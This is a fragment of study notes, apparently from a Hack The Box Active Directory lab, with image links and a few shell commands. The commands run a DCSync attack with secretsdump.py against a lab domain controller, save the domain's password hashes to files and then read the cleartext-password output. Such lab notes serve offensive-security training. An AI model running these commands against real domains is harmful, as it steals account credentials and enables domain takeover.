...
![[Z Assets/Images/88b2cc4eadb817089d920800e31bc3fd_MD5.webp]]
...
```shell-session
slomkm@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
...
```shell-session
slomkm@htb[/htb]$ ls inlanefreight_hashes*
...
![[Z Assets/Images/73001b998fa461c57146db6ce1dfae95_MD5.webp]]
...
```shell-session
slomkm@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
